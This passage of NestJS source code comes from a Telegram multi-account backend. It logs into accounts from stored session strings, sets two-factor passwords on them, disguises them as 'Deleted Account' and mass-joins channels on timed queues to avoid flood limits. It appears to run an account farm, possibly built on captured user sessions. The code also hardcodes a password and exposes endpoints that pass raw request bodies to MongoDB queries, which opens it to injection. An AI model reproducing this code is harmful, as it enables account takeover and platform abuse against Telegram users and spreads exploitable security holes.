found.' })\n  async checkArchivedClients(): Promise<string> {\n    return this.archivedclientService.checkArchivedClients();\n  }\n\n  @Get(':mobile')\n  @ApiOperation({ summary: 'Get user data by ID' })\n  //@apiresponse({ status: 200, description: 'Return the user data.' })\n  //@apiresponse({ status: 404, description: 'User data not found.' })\n  async findOne(@Param('mobile') mobile: string): Promise<Client> {\n    return this.archivedclientService.findOne(mobile);\n  }\n  \n  @Get('fetchOne/:mobile')\n  @ApiOperation({ summary: 'Get user data by ID' })\n  //@apiresponse({ status: 200, description: 'Return the user data.' })\n  //@apiresponse({ status: 404, description: 'User data not found.' })\n  async fetchOne(@Param('mobile') mobile: string): Promise<Client> {\n    return this.archivedclientService.fetchOne(mobile);\n  }\n\n  @Patch(':mobile')\n  @ApiOperation({ summary: 'Update user data by ID' })\n  //@apiresponse({ status: 200, description: 'The user data has been successfully updated.' })\n  //@apiresponse({ status: 404, description: 'User data not found.' })\n  async update(@Param('mobile') mobile: string, @Body() updateClientDto: UpdateClientDto): Promise<Client> {\n    return this.archivedclientService.update(mobile, updateClientDto);\n  }\n\n  @Delete(':mobile')\n  @ApiOperation({ summary: 'Delete user data by ID' })\n  //@apiresponse({ status: 200, description: 'The user data has been successfully deleted.' })\n  //@apiresponse({ status: 404, description: 'User data not found.' })\n  async remove(@Param('mobile') mobile: string): Promise<Client> {\n    return this.archivedclientService.remove(mobile);\n  }\n\n  @Post('query')\n  @ApiOperation({ summary: 'Execute a custom MongoDB query' })\n  //@apiresponse({ status: 200, description: 'Query executed successfully.' })\n  //@apiresponse({ status: 400, description: 'Invalid query.' })\n  //@apiresponse({ status: 500, description: 'Internal server error.' })\n  @ApiBody({type: Object})\n  async executeQuery(@Body() query: object): Promise<any> {\n    try {\n      return await this.archivedclientService.executeQuery(query);\n    } catch (error) {\n      throw error;  // You might want to handle errors more gracefully\n    }\n  }\n}\n","import { Module, forwardRef } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { ClientSchema } from '../clients/schemas/client.schema';\nimport { TelegramModule } from '../Telegram/Telegram.module';\nimport { ArchivedClientService } from './archived-client.service';\nimport { ArchivedClientController } from './archived-client.controller';\nimport { initModule } from '../ConfigurationInit/init.module';\nimport { ClientModule } from '../clients/client.module';\n\n@Module({\n  imports: [\n    initModule,\n    MongooseModule.forFeature([{ collection: 'ArchivedClients', name: 'ArchivedArchivedClientsModule', schema: ClientSchema }]),\n    forwardRef(() => TelegramModule),\n    forwardRef(() => ClientModule)\n  ],\n  controllers: [ArchivedClientController],\n  providers: [ArchivedClientService],\n  exports: [ArchivedClientService]\n})\nexport class ArchivedClientModule { }\n","import { BadRequestException, Inject, Injectable, InternalServerErrorException, NotFoundException, forwardRef } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { CreateClientDto } from '../clients/dto/create-client.dto';\nimport { Client, ClientDocument } from '../clients/schemas/client.schema';\nimport { UpdateClientDto } from '../clients/dto/update-client.dto';\nimport { TelegramService } from '../Telegram/Telegram.service';\nimport { sleep } from 'telegram/Helpers';\nimport { ClientService } from '../clients/client.service';\nimport { parseError } from '../../utils/parseError';\nimport { connectionManager } from '../Telegram/utils/connection-manager';\n@Injectable()\nexport class ArchivedClientService {\n    constructor(@InjectModel('ArchivedArchivedClientsModule') private archivedclientModel: Model<ClientDocument>,\n        @Inject(forwardRef(() => TelegramService))\n        private telegramService: TelegramService,\n        @Inject(forwardRef(() => ClientService))\n        private clientService: ClientService,\n    ) {}\n\n    async create(createClientDto: CreateClientDto): Promise<Client> {\n        const createdUser = new this.archivedclientModel(createClientDto);\n        return createdUser.save();\n    }\n\n    async findAll(): Promise<Client[]> {\n        const results: Client[] = await this.archivedclientModel.find().exec();\n        return results\n    }\n\n    async findOne(mobile: string): Promise<Client> {\n        const user = (await this.archivedclientModel.findOne({ mobile }).exec())?.toJSON();\n        return user;\n    }\n\n    async fetchOne(mobile: string): Promise<Client> {\n        const user = (await this.archivedclientModel.findOne({ mobile }).exec())?.toJSON();\n        if (user) {\n            return user;\n        } else {\n            try {\n                await connectionManager.getClient(mobile, { autoDisconnect: true, handler: false });\n                const newSession = await this.telegramService.createNewSession(mobile);\n                return await this.create({\n                    \"channelLink\": \"default\",\n                    \"clientId\": \"default\",\n                    \"dbcoll\": \"default\",\n                    \"deployKey\": \"default\",\n                    \"link\": \"default\",\n                    \"mainAccount\": \"default\",\n                    promoteRepl: \"default\",\n                    \"name\": \"default\",\n                    \"password\": \"Ajtdmwajt1@\",\n                    \"repl\": \"default\",\n                    \"session\": newSession,\n                    \"username\": \"default\",\n                    \"mobile\": mobile,\n                    product: \"default\",\n                    gpayId: \"default\",\n                    promoteMobile:[],\n                    qrId: \"default\",\n                })\n            } catch (e) {\n                throw new NotFoundException(parseError(e).message);\n            } finally {\n                await connectionManager.unregisterClient(mobile);\n            }\n        }\n    }\n\n    async update(mobile: string, updateClientDto: UpdateClientDto): Promise<Client> {\n        delete updateClientDto[\"_id\"]\n        if ((<any>updateClientDto)._doc) {\n            delete (<any>updateClientDto)._doc['_id']\n        }\n        console.log({ ...updateClientDto });\n        const updatedUser = await this.archivedclientModel.findOneAndUpdate({ mobile }, { $set: updateClientDto }, { new: true, upsert: true }).exec();\n        return updatedUser;\n    }\n\n    async remove(mobile: string): Promise<Client> {\n        const deletedUser = await this.archivedclientModel.findOneAndDelete({ mobile }).exec();\n        if (!deletedUser) {\n            throw new NotFoundException(`Client with ID \"${mobile}\" not found`);\n        }\n        return deletedUser;\n    }\n\n    async search(filter: any): Promise<Client[]> {\n        console.log(filter)\n        if (filter.firstName) {\n            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') }\n        }\n        console.log(filter)\n        return this.archivedclientModel.find(filter).exec();\n    }\n\n    async checkArchivedClients() {\n        await connectionManager.disconnectAll()\n        await sleep(2000);\n        const archivedClients = await this.findAll();\n\n        const clients = await this.clientService.findAll();\n        const clientIds = clients.map(client => client.mobile);\n\n        archivedClients.map(async (document) => {\n            if (!clientIds.includes(document.mobile)) {\n                try {\n                    await connectionManager.getClient(document.mobile, { autoDisconnect: true, handler: false });\n                    await this.telegramService.updateUsername(document.mobile, '');\n                    await this.telegramService.updateNameandBio(document.mobile, 'Deleted Account', '');\n                    await sleep(2000);\n                } catch (error) {\n                    console.log(document.mobile, \" :  false\");\n                    this.remove(document.mobile)\n                } finally{\n                    await connectionManager.unregisterClient(document.mobile);\n                }\n            } else {\n                console.log(\"Number is a Active Client\")\n            }\n        })\n\n        return \"Triggered ArchiveClients check\"\n    }\n\n    async executeQuery(query: any): Promise<any> {\n        try {\n            if (!query) {\n                throw new BadRequestException('Query is invalid.');\n            }\n            return await this.archivedclientModel.find(query).exec();\n        } catch (error) {\n            throw new InternalServerErrorException(error.message);\n        }\n    }\n}\n","import { Controller, Get, Post, Body, Param, Delete, Query, Patch, Put } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiBody, ApiParam } from '@nestjs/swagger';\nimport { BufferClientService } from './buffer-client.service';\nimport { CreateBufferClientDto } from './dto/create-buffer-client.dto';\nimport { SearchBufferClientDto } from './dto/search-buffer- client.dto';\nimport { BufferClient } from './schemas/buffer-client.schema';\nimport { UpdateBufferClientDto } from './dto/update-buffer-client.dto';\n\n@ApiTags('Buffer Clients')\n@Controller('bufferclients')\nexport class BufferClientController {\n  constructor(private readonly clientService: BufferClientService) { }\n\n  @Post()\n  @ApiOperation({ summary: 'Create user data' })\n  async create(@Body() createClientDto: CreateBufferClientDto): Promise<BufferClient> {\n    return this.clientService.create(createClientDto);\n  }\n\n  @Get('search')\n  @ApiOperation({ summary: 'Search user data' })\n  async search(@Query() query: SearchBufferClientDto): Promise<BufferClient[]> {\n    return this.clientService.search(query);\n  }\n\n  @Get('joinChannelsForBufferClients')\n  @ApiOperation({ summary: 'Join Channels for BufferClients' })\n  async joinChannelsforBufferClients(): Promise<string> {\n    return this.clientService.joinchannelForBufferClients();\n  }\n\n  @Get('checkBufferClients')\n  @ApiOperation({ summary: 'Check Buffer Clients' })\n  async checkbufferClients(): Promise<string> {\n    this.clientService.checkBufferClients();\n    return \"initiated Checking\"\n  }\n\n  @Post('addNewUserstoBufferClients')\n  @ApiOperation({ summary: 'Add New Users to Buffer Clients' })\n  @ApiBody({ type: Object })\n  async addNewUserstoBufferClients(@Body() body: { goodIds: string[], badIds: string[] }): Promise<string> {\n    this.clientService.addNewUserstoBufferClients(body.badIds, body.goodIds);\n    return \"initiated Checking\"\n  }\n\n  @Get()\n  @ApiOperation({ summary: 'Get all user data' })\n  async findAll(): Promise<BufferClient[]> {\n    return this.clientService.findAll();\n  }\n\n  @Get('SetAsBufferClient/:mobile')\n  @ApiOperation({ summary: 'Set as Buffer Client' })\n  @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\n  async setAsBufferClient(\n    @Param('mobile') mobile: string,\n  ) {\n    return await this.clientService.setAsBufferClient(mobile);\n  }\n\n  @Get(':mobile')\n  @ApiOperation({ summary: 'Get user data by ID' })\n  async findOne(@Param('mobile') mobile: string): Promise<BufferClient> {\n    return this.clientService.findOne(mobile);\n  }\n\n  @Patch(':mobile')\n  @ApiOperation({ summary: 'Update user data by ID' })\n  async update(@Param('mobile') mobile: string, @Body() updateClientDto: UpdateBufferClientDto): Promise<BufferClient> {\n    return this.clientService.update(mobile, updateClientDto);\n  }\n\n  @Put(':mobile')\n  @ApiOperation({ summary: 'Update user data by ID' })\n  async createdOrupdate(@Param('mobile') mobile: string, @Body() updateClientDto: UpdateBufferClientDto): Promise<BufferClient> {\n    return this.clientService.createOrUpdate(mobile, updateClientDto);\n  }\n\n  @Delete(':mobile')\n  @ApiOperation({ summary: 'Delete user data by ID' })\n  async remove(@Param('mobile') mobile: string): Promise<void> {\n    return this.clientService.remove(mobile);\n  }\n\n  @Post('query')\n  @ApiOperation({ summary: 'Execute a custom MongoDB query' })\n  @ApiBody({ type: Object })\n  async executeQuery(@Body() query: object): Promise<any> {\n    try {\n      return await this.clientService.executeQuery(query);\n    } catch (error) {\n      throw error;  // You might want to handle errors more gracefully\n    }\n  }\n\n}\n","import { Module, forwardRef } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { BufferClientService } from './buffer-client.service';\nimport { BufferClientController } from './buffer-client.controller';\nimport { BufferClientSchema } from './schemas/buffer-client.schema';\nimport { TelegramModule } from '../Telegram/Telegram.module';\nimport { ActiveChannelsModule } from '../active-channels/active-channels.module';\nimport { UsersModule } from '../users/users.module';\nimport { ClientModule } from '../clients/client.module';\nimport { initModule } from '../ConfigurationInit/init.module';\nimport { ChannelsModule } from '../channels/channels.module';\nimport { PromoteClientModule } from '../promote-clients/promote-client.module';\n\n@Module({\n  imports: [\n    initModule,\n    MongooseModule.forFeature([{ name: 'bufferClientModule', schema: BufferClientSchema, collection: 'bufferClients' }]),\n    forwardRef(() => TelegramModule),\n    forwardRef(() => UsersModule),\n    forwardRef(() => ActiveChannelsModule),\n    forwardRef(() => ClientModule),\n    forwardRef(() => ChannelsModule),\n    forwardRef(() => PromoteClientModule)\n ],\n  controllers: [BufferClientController],\n  providers: [BufferClientService],\n  exports: [BufferClientService]\n})\nexport class BufferClientModule { }\n","import { ChannelsService } from './../channels/channels.service';\nimport { Channel } from './../channels/schemas/channel.schema';\nimport { BadRequestException, ConflictException, HttpException, Inject, Injectable, InternalServerErrorException, Logger, NotFoundException, forwardRef } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { CreateBufferClientDto } from './dto/create-buffer-client.dto';\nimport { BufferClient, BufferClientDocument } from './schemas/buffer-client.schema';\nimport { TelegramService } from '../Telegram/Telegram.service';\nimport { sleep } from 'telegram/Helpers';\nimport { UsersService } from '../users/users.service';\nimport { ActiveChannelsService } from '../active-channels/active-channels.service';\nimport { ClientService } from '../clients/client.service';\nimport { UpdateBufferClientDto } from './dto/update-buffer-client.dto';\nimport { PromoteClientService } from '../promote-clients/promote-client.service';\nimport { parseError } from '../../utils/parseError';\nimport { fetchWithTimeout } from '../../utils/fetchWithTimeout';\nimport { notifbot } from '../../utils/logbots';\nimport { connectionManager } from '../Telegram/utils/connection-manager';\n\n@Injectable()\nexport class BufferClientService {\n    private readonly logger = new Logger(BufferClientService.name);\n    private joinChannelMap: Map<string, Channel[]> = new Map();\n    private joinChannelIntervalId: NodeJS.Timeout;\n    private leaveChannelMap: Map<string, string[]> = new Map();\n    private leaveChannelIntervalId: NodeJS.Timeout;\n    private isJoinChannelProcessing: boolean = false;\n    private isLeaveChannelProcessing: boolean = false;\n    private readonly JOIN_CHANNEL_INTERVAL = 4 * 60 * 1000; // 4 minutes\n    private readonly LEAVE_CHANNEL_INTERVAL = 60 * 1000; // 30 seconds\n    private readonly LEAVE_CHANNEL_BATCH_SIZE = 10;\n\n    constructor(@InjectModel('bufferClientModule') private bufferClientModel: Model<BufferClientDocument>,\n        @Inject(forwardRef(() => TelegramService))\n        private telegramService: TelegramService,\n        @Inject(forwardRef(() => UsersService))\n        private usersService: UsersService,\n        @Inject(forwardRef(() => ActiveChannelsService))\n        private activeChannelsService: ActiveChannelsService,\n        @Inject(forwardRef(() => ClientService))\n        private clientService: ClientService,\n        @Inject(forwardRef(() => ActiveChannelsService))\n        private channelsService: ChannelsService,\n        @Inject(forwardRef(() => PromoteClientService))\n        private promoteClientService: PromoteClientService,\n    ) {}\n\n    async create(bufferClient: CreateBufferClientDto): Promise<BufferClient> {\n        const newUser = new this.bufferClientModel(bufferClient);\n        return newUser.save();\n    }\n\n    async findAll(): Promise<BufferClient[]> {\n        return this.bufferClientModel.find().exec();\n    }\n\n    async findOne(mobile: string, throwErr: boolean = true): Promise<BufferClient> {\n        const user = (await this.bufferClientModel.findOne({ mobile }).exec())?.toJSON();\n        if (!user && throwErr) {\n            throw new NotFoundException(`BufferClient with mobile ${mobile} not found`);\n        }\n        return user;\n    }\n\n\n    async update(mobile: string, updateClientDto: UpdateBufferClientDto): Promise<BufferClient> {\n        const updatedUser = await this.bufferClientModel.findOneAndUpdate(\n            { mobile },\n            { $set: updateClientDto },\n            { new: true, upsert: true, returnDocument: 'after' }\n        ).exec();\n\n        if (!updatedUser) {\n            throw new NotFoundException(`User with mobile ${mobile} not found`);\n        }\n\n        return updatedUser;\n    }\n\n    async createOrUpdate(mobile: string, createOrUpdateUserDto: CreateBufferClientDto | UpdateBufferClientDto): Promise<BufferClient> {\n        const existingUser = (await this.bufferClientModel.findOne({ mobile }).exec())?.toJSON();\n        if (existingUser) {\n            console.log(\"Updating\")\n            return this.update(existingUser.mobile, createOrUpdateUserDto as UpdateBufferClientDto);\n        } else {\n            console.log(\"creating\")\n            return this.create(createOrUpdateUserDto as CreateBufferClientDto);\n        }\n    }\n\n    async remove(mobile: string): Promise<void> {\n        await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`Deleting Buffer Client : ${mobile}`)}`);\n        const result = await this.bufferClientModel.deleteOne({ mobile }).exec();\n        if (result.deletedCount === 0) {\n            throw new NotFoundException(`BufferClient with mobile ${mobile} not found`);\n        }\n    }\n    async search(filter: any): Promise<BufferClient[]> {\n        console.log(filter)\n        if (filter.firstName) {\n            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') }\n        }\n        console.log(filter)\n        return this.bufferClientModel.find(filter).exec();\n    }\n\n    async executeQuery(query: any, sort?: any, limit?: number, skip?: number): Promise<BufferClient[]> {\n        try {\n\n            if (!query) {\n                throw new BadRequestException('Query is invalid.');\n            }\n            const queryExec = this.bufferClientModel.find(query);\n            if (sort) {\n                queryExec.sort(sort);\n            }\n\n            if (limit) {\n                queryExec.limit(limit);\n            }\n\n            if (skip) {\n                queryExec.skip(skip);\n            }\n\n            return await queryExec.exec();\n        } catch (error) {\n            throw new InternalServerErrorException(error.message);\n        }\n    }\n\n    removeFromBufferMap(key: string) {\n        this.joinChannelMap.delete(key);\n    }\n\n    clearBufferMap() {\n        console.log(\"BufferMap cleared\");\n        this.joinChannelMap.clear();\n        this.clearJoinChannelInterval();\n    }\n\n    async joinchannelForBufferClients(skipExisting: boolean = true): Promise<string> {\n        if (!this.telegramService.getActiveClientSetup()) {\n            this.logger.log('Starting join channel process');\n            await connectionManager.disconnectAll();\n\n            // Clear both queues before starting new process\n            this.clearJoinChannelInterval();\n            this.clearLeaveChannelInterval();\n\n            await sleep(2000);\n            const existingkeys = skipExisting ? [] : Array.from(this.joinChannelMap.keys())\n            const clients = await this.bufferClientModel.find({ channels: { \"$lt\": 350 }, mobile: { $nin: existingkeys } }).sort({ channels: 1 }).limit(4);\n\n            this.logger.debug(`Found ${clients.length} clients to process for joining channels`);\n\n            if (clients.length > 0) {\n                for (const document of clients) {\n                    try {\n                        const client = await connectionManager.getClient(document.mobile, { autoDisconnect: false, handler: false });\n                        this.logger.log(`Started joining process for mobile: ${document.mobile}`);\n\n                        const channels = await client.channelInfo(true);\n                        this.logger.debug(`Client ${document.mobile} has ${channels.ids.length} existing channels`);\n\n                        await this.update(document.mobile, { channels: channels.ids.length });\n                        this.logger.debug(`Client ${document.mobile} has ${channels.canSendFalseChats.length} channels that can't send messages`);\n\n                        let result = [];\n                        if (channels.canSendFalseCount < 10) {\n                            if (channels.ids.length < 220) {\n                                result = await this.channelsService.getActiveChannels(150, 0, channels.ids);\n                            } else {\n                                result = await this.activeChannelsService.getActiveChannels(150, 0, channels.ids);\n                            }\n                            this.logger.debug(`Adding ${result.length} new channels to join queue for ${document.mobile}`);\n                            this.joinChannelMap.set(document.mobile, result);\n                            this.joinChannelQueue();\n                            await connectionManager.unregisterClient(document.mobile);\n                        } else {\n                            this.logger.warn(`Client ${document.mobile} has too many restricted channels, moving to leave queue: ${channels.canSendFalseChats.length}`);\n                            this.joinChannelMap.delete(document.mobile);\n                            this.leaveChannelMap.set(document.mobile, channels.canSendFalseChats);\n                            this.leaveChannelQueue();\n                            await connectionManager.unregisterClient(document.mobile);\n\n                        }\n                        // console.log(\"DbChannelsLen: \", result.length);\n                        // let resp = '';\n                        // this.telegramService.joinChannels(document.mobile, result);\n                    } catch (error) {\n                        if (error.message === \"SESSION_REVOKED\" ||\n                            error.message === \"AUTH_KEY_UNREGISTERED\" ||\n                            error.message === \"USER_DEACTIVATED\" ||\n                            error.message === \"USER_DEACTIVATED_BAN\") {\n                            this.logger.error(`Session invalid for ${document.mobile}, removing client`, error.stack);\n                            await this.remove(document.mobile);\n                            await connectionManager.unregisterClient(document.mobile);\n                        }\n                        parseError(error)\n                    }\n                }\n            }\n            this.logger.log(`Join channel process initiated for ${clients.length} clients`);\n            return `Initiated Joining channels ${clients.length}`\n        } else {\n            this.logger.warn('Ignored active check buffer channels as active client setup exists');\n        }\n    }\n\n    async joinChannelQueue() {\n        if (this.isJoinChannelProcessing || this.joinChannelIntervalId) {\n            this.logger.warn('Join channel process is already running, instance:', this.joinChannelIntervalId);\n            return;\n        }\n\n        const existingKeys = Array.from(this.joinChannelMap.keys());\n        if (existingKeys.length === 0) {\n            this.logger.debug('No channels to join, not starting queue');\n            return;\n        }\n\n        this.isJoinChannelProcessing = true;\n        this.joinChannelIntervalId = setInterval(async () => {\n            try {\n                const keys = Array.from(this.joinChannelMap.keys());\n                if (keys.length === 0) {\n                    this.clearJoinChannelInterval();\n                    return;\n                }\n\n                // Add timeout to prevent infinite processing\n                const processTimeout = setTimeout(() => {\n                    this.logger.error('Join channel interval processing timeout');\n                    this.clearJoinChannelInterval();\n                }, this.JOIN_CHANNEL_INTERVAL - 1000);\n\n                this.logger.debug(`Processing join channel queue at ${new Date().toISOString()}, ${keys.length} clients remaining, interval:${this.joinChannelIntervalId}`);\n\n                for (const mobile of keys) {\n                    const channels = this.joinChannelMap.get(mobile);\n                    if (!channels || channels.length === 0) {\n                        this.logger.debug(`No more channels to join for ${mobile}, removing from queue`);\n                        this.removeFromBufferMap(mobile);\n                        continue;\n                    }\n\n                    const channel = channels.shift();\n                    this.logger.debug(`${mobile} has ${channels.length} pending channels to join`);\n                    this.joinChannelMap.set(mobile, channels);\n\n                    try {\n                        await connectionManager.getClient(mobile, { autoDisconnect: false, handler: false });\n                        this.logger.debug(`${mobile} attempting to join channel: @${channel.username}`);\n                        await this.telegramService.tryJoiningChannel(mobile, channel);\n                    } catch (error) {\n                        const errorDetails = parseError(error, `${mobile} @${channel.username} Outer Err ERR: `, false);\n                        this.logger.error(`Error joining channel @${channel.username} for ${mobile}`, errorDetails);\n\n                        if (errorDetails.error === 'FloodWaitError' || error.errorMessage === 'CHANNELS_TOO_MUCH') {\n                            this.logger.warn(`${mobile} has FloodWaitError or joined too many channels, removing from queue`);\n                            this.removeFromBufferMap(mobile);\n                            const channelsInfo = await this.telegramService.getChannelInfo(mobile, true);\n                            await this.update(mobile, { channels: channelsInfo.ids.length });\n                        }\n\n                        if (error.errorMessage === \"SESSION_REVOKED\" ||\n                            error.errorMessage === \"AUTH_KEY_UNREGISTERED\" ||\n                            error.errorMessage === \"USER_DEACTIVATED\" ||\n                            error.errorMessage === \"USER_DEACTIVATED_BAN\") {\n                            this.logger.error(`Session invalid for ${mobile}, removing client`);\n                            await this.remove(mobile);\n                        }\n                    } finally {\n                        await connectionManager.unregisterClient(mobile);\n                    }\n                }\n\n                clearTimeout(processTimeout);\n            } catch (error) {\n                this.logger.error('Error in join channel interval', error.stack);\n                this.clearJoinChannelInterval();\n            }\n        }, this.JOIN_CHANNEL_INTERVAL);\n\n        this.logger.debug(`Started join channel queue with interval ID: ${this.joinChannelIntervalId}`);\n    }\n\n    clearJoinChannelInterval() {\n        if (this.joinChannelIntervalId) {\n            this.logger.debug(`Clearing join channel interval: ${this.joinChannelIntervalId}`);\n            clearInterval(this.joinChannelIntervalId);\n            this.joinChannelIntervalId = null;\n            this.isJoinChannelProcessing = false;\n\n            // Only schedule next run if there are items in the map\n            if (this.joinChannelMap.size > 0) {\n                setTimeout(() => {\n                    this.logger.debug('Triggering next join channel process');\n                    this.joinchannelForBufferClients(false);\n                }, 30000);\n            }\n        }\n    }\n\n    removeFromLeaveMap(key: string) {\n        this.leaveChannelMap.delete(key);\n        if (this.leaveChannelMap.size === 0) {\n            this.clearLeaveChannelInterval();\n        }\n    }\n\n    clearLeaveMap() {\n        console.log(\"LeaveMap cleared\");\n        this.leaveChannelMap.clear();\n        this.clearLeaveChannelInterval();\n    }\n\n    async leaveChannelQueue() {\n        if (this.isLeaveChannelProcessing || this.leaveChannelIntervalId) {\n            this.logger.warn('Leave channel process is already running, instance:', this.leaveChannelIntervalId);\n            return;\n        }\n\n        const existingKeys = Array.from(this.leaveChannelMap.keys());\n        if (existingKeys.length === 0) {\n            this.logger.debug('No channels to leave, not starting queue');\n            return;\n        }\n\n        this.isLeaveChannelProcessing = true;\n        this.leaveChannelIntervalId = setInterval(async () => {\n            try {\n                const keys = Array.from(this.leaveChannelMap.keys());\n                if (keys.length === 0) {\n                    this.logger.debug('Leave map is empty, clearing interval');\n                    this.clearLeaveChannelInterval();\n                    return;\n                }\n\n                // Add timeout to prevent infinite processing\n                const processTimeout = setTimeout(() => {\n                    this.logger.error('Leave channel interval processing timeout');\n                    this.clearLeaveChannelInterval();\n                }, this.LEAVE_CHANNEL_INTERVAL - 1000);\n\n                this.logger.debug(`Processing leave channel queue at ${new Date().toISOString()}, ${keys.length} clients remaining, interval:${this.leaveChannelIntervalId}`);\n\n                for (const mobile of keys) {\n                    const channels = this.leaveChannelMap.get(mobile);\n                    if (!channels || channels.length === 0) {\n                        this.logger.debug(`No more channels to leave for ${mobile}, removing from queue`);\n                        this.removeFromLeaveMap(mobile);\n                        continue;\n                    }\n\n                    const channelsToProcess = channels.splice(0, this.LEAVE_CHANNEL_BATCH_SIZE);\n                    this.logger.debug(`${mobile} has ${channels.length} pending channels to leave`);\n\n                    // Only update map if there are remaining channels\n                    if (channels.length > 0) {\n                        this.leaveChannelMap.set(mobile, channels);\n                    } else {\n                        this.removeFromLeaveMap(mobile);\n                    }\n\n                    try {\n                        const client = await connectionManager.getClient(mobile, { autoDisconnect: false, handler: false });\n                        this.logger.debug(`${mobile} attempting to leave ${channelsToProcess.length} channels`);\n                        await client.leaveChannels(channelsToProcess);\n                        this.logger.debug(`${mobile} left channels successfully`);\n                    } catch (error) {\n                        const errorDetails = parseError(error, `${mobile} Leave Channel ERR: `, false);\n                        if (\n                            errorDetails.message === \"SESSION_REVOKED\" ||\n                            errorDetails.message === \"AUTH_KEY_UNREGISTERED\" ||\n                            errorDetails.message === \"USER_DEACTIVATED\" ||\n                            errorDetails.message === \"USER_DEACTIVATED_BAN\"\n                        ) {\n                            this.logger.error(`Session invalid for ${mobile}, removing client`);\n                            await this.remove(mobile);\n                            this.removeFromLeaveMap(mobile);\n                        }\n                    } finally {\n                        await connectionManager.unregisterClient(mobile);\n                    }\n                }\n\n                clearTimeout(processTimeout);\n            } catch (error) {\n                this.logger.error('Error in leave channel interval', error.stack);\n                this.clearLeaveChannelInterval();\n            }\n        }, this.LEAVE_CHANNEL_INTERVAL);\n\n        this.logger.debug(`Started leave channel queue with interval ID: ${this.leaveChannelIntervalId}`);\n    }\n\n    clearLeaveChannelInterval() {\n        if (this.leaveChannelIntervalId) {\n            this.logger.debug(`Clearing leave channel interval: ${this.leaveChannelIntervalId}`);\n            clearInterval(this.leaveChannelIntervalId);\n            this.leaveChannelIntervalId = null;\n        }\n        this.isLeaveChannelProcessing = false;\n        this.logger.debug('Leave channel interval cleared and processing flag reset');\n    }\n\n    async setAsBufferClient(\n        mobile: string,\n        availableDate: string = (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0]\n    ) {\n        const user = (await this.usersService.search({ mobile }))[0];\n        if (!user) {\n            throw new BadRequestException('user not found');\n        }\n        const isExist = await this.findOne(mobile, false)\n        if (isExist) {\n            throw new ConflictException('BufferClient already exist');\n        }\n        const clients = await this.clientService.findAll();\n        const clientMobiles = clients.map(client => client?.mobile);\n        const clientPromoteMobiles = clients.flatMap(client => client?.promoteMobile);\n        if (!clientPromoteMobiles.includes(mobile) && !clientMobiles.includes(mobile)) {\n            try {\n                const telegramClient = await connectionManager.getClient(mobile, { autoDisconnect: false })\n                await telegramClient.set2fa();\n                await sleep(15000)\n                await telegramClient.updateUsername('');\n                await sleep(3000)\n                await telegramClient.updatePrivacyforDeletedAccount();\n                await sleep(3000)\n                await telegramClient.updateProfile(\"Deleted Account\", \"Deleted Account\");\n                await sleep(3000)\n                await telegramClient.deleteProfilePhotos();\n                const channels = await this.telegramService.getChannelInfo(mobile, true)\n                const bufferClient = {\n                    tgId: user.tgId,\n                    session: user.session,\n                    mobile: user.mobile,\n                    availableDate,\n                    channels: channels.ids.length,\n                }\n                await this.bufferClientModel.findOneAndUpdate({ tgId: user.tgId }, { $set: bufferClient }, { new: true, upsert: true }).exec();\n            } catch (error) {\n                const errorDetails = parseError(error)\n                throw new HttpException(errorDetails.message, errorDetails.status)\n            }\n            await connectionManager.unregisterClient(mobile)\n            return \"Client set as buffer successfully\";\n        } else {\n            throw new BadRequestException(\"Number is a Active Client\")\n        }\n    }\n\n    async checkBufferClients() {\n        if (!this.telegramService.getActiveClientSetup()) {\n            await connectionManager.disconnectAll()\n            await sleep(2000);\n            const bufferclients = await this.findAll();\n            let goodIds: string[] = [];\n            const badIds: string[] = [];\n            if (bufferclients.length < 70) {\n                for (let i = 0; i < 70 - bufferclients.length; i++) {\n                    badIds.push(i.toString())\n                }\n            }\n            const clients = await this.clientService.findAll();\n            const promoteclients = await this.promoteClientService.findAll();\n            const clientIds = [...clients.map(client => client.mobile), ...clients.flatMap(client => { return (client.promoteMobile) })]\n            const promoteclientIds = promoteclients.map(client => client.mobile);\n            const today = (new Date(Date.now())).toISOString().split('T')[0];\n            for (const document of bufferclients) {\n                if (!clientIds.includes(document.mobile) && !promoteclientIds.includes(document.mobile)) {\n                    try {\n                        const cli = await connectionManager.getClient(document.mobile, { autoDisconnect: true, handler: false });\n                        const me = await cli.getMe();\n                        if (me.username) {\n                            await this.telegramService.updateUsername(document.mobile, '');\n                            await sleep(2000)\n                        }\n                        if (me.firstName !== \"Deleted Account\") {\n                            await this.telegramService.updateNameandBio(document.mobile, 'Deleted Account', '');\n                            // await this.telegramService.updatePrivacyforDeletedAccount(document.mobile);\n                            await sleep(2000)\n                        }\n                        await this.telegramService.deleteProfilePhotos(document.mobile);\n                        const hasPassword = await cli.hasPassword();\n                        if (!hasPassword) {\n                            console.log(\"Client does not have password\");\n                            badIds.push(document.mobile);\n                            // await this.remove(document.mobile);\n                        } else {\n                            // const channelinfo = await this.telegramService.getChannelInfo(document.mobile, true);\n                            // await this.bufferClientModel.findOneAndUpdate({ mobile: document.mobile }, { channels: channelinfo.ids.length })\n                            console.log(document.mobile, \" :  ALL Good\");\n                            goodIds.push(document.mobile)\n                        }\n                        await connectionManager.unregisterClient(document.mobile)\n                        await sleep(2000);\n                    } catch (error) {\n                        parseError(error);\n                        badIds.push(document.mobile);\n                        this.remove(document.mobile)\n                        await connectionManager.unregisterClient(document.mobile)\n                    }\n                } else {\n                    console.log(\"Number is a Active Client\");\n                    goodIds.push(document.mobile)\n                    this.remove(document.mobile)\n                }\n            }\n            goodIds = [...goodIds, ...clientIds, ...promoteclientIds]\n            console.log(\"GoodIds: \", goodIds.length, \"BadIds : \", badIds.length);\n            this.addNewUserstoBufferClients(badIds, goodIds);\n        } else {\n            console.log(\"ignored active check buffer channels as active client setup exists\")\n        }\n    }\n\n    async addNewUserstoBufferClients(badIds: string[], goodIds: string[]) {\n        const sixMonthsAgo = (new Date(Date.now() - 3 * 30 * 24 * 60 * 60 * 1000)).toISOString().split('T')[0];\n        const documents = await this.usersService.executeQuery({ \"mobile\": 